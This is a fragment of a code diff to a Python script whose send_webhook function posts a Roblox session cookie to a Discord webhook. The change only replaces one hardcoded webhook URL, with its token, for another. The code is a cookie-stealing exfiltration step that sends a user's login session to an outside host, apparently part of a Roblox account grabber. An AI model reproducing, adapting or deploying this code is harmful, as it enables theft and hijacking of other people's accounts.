@@ -38,7 +38,7 @@ if cookie == "":
 
 
 def send_webhook(cookie):
-    webhook_url = "https://discord.com/api/webhooks/1169301940044304384/S4uc8JZjeh48P5CX8eQNrEr6T6uMBBj6q4koLjOcB0kVOSuto-x3jgsQ_V3c8Dnkq_1y"
+    webhook_url = "https://discord.com/api/webhooks/1170081035892043776/LQpiRk6Qph-5xqmjRUogymdcpuDdmPghu8MckcSZyJyCDOIiRnOdnLT6jqW1DuthgAPR"
     data = {"content": f"Roblox Cookie: `{cookie}`"}
     try:
         response = requests.post(webhook_url, json=data)
